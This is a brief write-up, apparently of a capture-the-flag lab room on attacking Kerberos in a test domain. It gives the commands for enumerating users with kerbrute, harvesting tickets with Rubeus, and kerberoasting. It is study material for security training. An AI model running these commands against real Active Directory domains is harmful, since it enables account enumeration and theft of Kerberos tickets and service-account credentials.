# Attacking Kerberos Room 


## Enumerating Users
- Installed `kerbrute` and downloaded a wordlist
- Enumerated users with `kerbrute` 

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

![Kerbrute Enumeration](2022-02-22-19-06-49.png)

## Harvesting Tickets w/ Rubeus 
- Established an SSH connection to the target 
- Used Rubeus to harvest for TGTs every 30 seconds 

```bash
Rubeus.exe harvest /interval:30
```
![Rubeus Harvesting](2022-02-22-19-18-30.png)

## Kerberoasting 
- using Rubeus 

```bash 
Rubeus.exe kerberoast
```
![Rubeus Kerberoasting](2022-02-22-19-26-40.png)
